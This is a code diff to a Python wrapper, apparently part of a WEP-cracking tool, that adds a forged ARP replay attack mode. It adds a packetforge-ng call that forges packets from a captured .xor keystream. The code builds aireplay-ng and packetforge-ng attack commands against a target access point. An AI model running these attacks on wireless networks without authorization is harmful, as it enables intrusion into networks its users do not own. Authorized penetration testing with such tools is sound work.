@@ -3,15 +3,18 @@
 from Configuration import Configuration
 from Process import Process
 
+import os
+
 class WEPAttackType(object):
     ''' Enumeration of different WEP attack types '''
-    fakeauth   = 0
-    replay     = 1
-    chopchop   = 2
-    fragment   = 3
-    caffelatte = 4
-    p0841      = 5
-    hirte      = 6
+    fakeauth     = 0
+    replay       = 1
+    chopchop     = 2
+    fragment     = 3
+    caffelatte   = 4
+    p0841        = 5
+    hirte        = 6
+    forgedreplay = 7
 
     def __init__(self, var):
         '''
@@ -49,7 +52,7 @@ class WEPAttackType(object):
 
 
 class Aireplay(object):
-    def __init__(self, target, attack_type, client_mac=None):
+    def __init__(self, target, attack_type, client_mac=None, replay_file=None):
         '''
             Starts aireplay process.
             Args:
@@ -57,8 +60,24 @@ class Aireplay(object):
                 attack_type - int, str, or WEPAttackType instance.
                 client_mac - MAC address of an associated client.
         '''
-        cmd = Aireplay.get_aireplay_command(target, attack_type, client_mac)
-        self.pid = Process(cmd, devnull=False)
+        cmd = Aireplay.get_aireplay_command(target,
+                                            attack_type,
+                                            client_mac=client_mac,
+                                            replay_file=replay_file)
+
+        # TODO: set 'stdout' when creating process to store output to file.
+        # AttackWEP will read file to get status of attack.
+        # E.g., chopchop will regex "(\d+)% done" to get percent complete.
+        '''
+        from subprocess import PIPE
+        sout = PIPE
+        if '--chopchop' in cmd:
+            sout = open(Configuration.temp('chopchop'), 'w')
+        '''
+
+        self.pid = Process(cmd,
+                           devnull=False,
+                           cwd=Configuration.temp())
 
     def is_running(self):
         return self.pid.poll() == None
@@ -73,13 +92,15 @@ class Aireplay(object):
         return self.pid.stdout()
 
     @staticmethod
-    def get_aireplay_command(target, attack_type, client_mac=None):
+    def get_aireplay_command(target, attack_type,
+                             client_mac=None, replay_file=None):
         '''
             Generates aireplay command based on target and attack type
             Args:
-                target - Instance of Target object, AP to attack.
+                target      - Instance of Target object, AP to attack.
                 attack_type - int, str, or WEPAttackType instance.
-                client_mac - MAC address of an associated client.
+                client_mac  - MAC address of an associated client.
+                replay_file - .Cap file to replay via --arpreplay
         '''
 
         # Interface is required at this point
@@ -156,17 +177,60 @@ class Aireplay(object):
                 raise Exception("Client is required for hirte attack")
             cmd.append('--cfrag')
             cmd.extend(['-h', client_mac])
+        elif attack_type == WEPAttackType.forgedreplay:
+            if client_mac == None or replay_file == None:
+                raise Exception(
+                    "Client_mac and Replay_File are required for arp replay")
+            cmd.append('--arpreplay')
+            cmd.extend(['-b', target.bssid])
+            cmd.extend(['-r', replay_file])
+            cmd.extend(['-F']) # Automatically choose first packet
+            cmd.extend(['-x', str(Configuration.wep_pps)])
         else:
             raise Exception("Unexpected attack type: %s" % attack_type)
 
         cmd.append(Configuration.interface)
         return cmd
 
+    @staticmethod
+    def get_xor():
+        ''' Finds the last .xor file in the directory '''
+        xor = None
+        for fil in os.listdir(Configuration.temp()):
+            if fil.startswith('replay_') and fil.endswith('.xor'):
+                xor = fil
+        return xor
+
+    @staticmethod
+    def forge_packet(xor_file, bssid, station_mac):
+        ''' Forges packet from .xor file '''
+        forged_file = 'forged.cap'
+        cmd = [
+            'packetforge-ng',
+            '-0',
+            '-a', bssid,           # Target MAC
+            '-h', station_mac,     # Client MAC
+            '-k', '192.168.1.2',   # Dest IP
+            '-l', '192.168.1.100', # Source IP
+            '-y', xor_file,        # Read PRNG from .xor file
+            '-w', forged_file,     # Write to
+            Configuration.interface
+        ]
+
+        cmd = '"%s"' % '" "'.join(cmd)
+        (out, err) = Process.call(cmd, cwd=Configuration.temp(), shell=True)
+        if out.strip() == 'Wrote packet to: %s' % forged_file:
+            return forged_file
+        else:
+            from Color import Color
+            Color.pl('{!} {R}failed to forge packet from .xor file{W}')
+            Color.pl('output:\n"%s"' % out)
+            return None
+
 
 if __name__ == '__main__':
     t = WEPAttackType(4)
-    print t.name, type(t.name), t.value
-
+    print t.name, type(t.name), t.value 
     t = WEPAttackType('caffelatte')
     print t.name, type(t.name), t.value
 
@@ -188,3 +252,9 @@ if __name__ == '__main__':
     print aireplay.get_output()
     '''
 
+    '''
+    forge = Aireplay.forge_packet('/tmp/replay_dec-0605-060243.xor', \
+                                  'A4:2B:8C:16:6B:3A', \
+                                  '00:C0:CA:4E:CA:E0')
+    print forge
+    '''
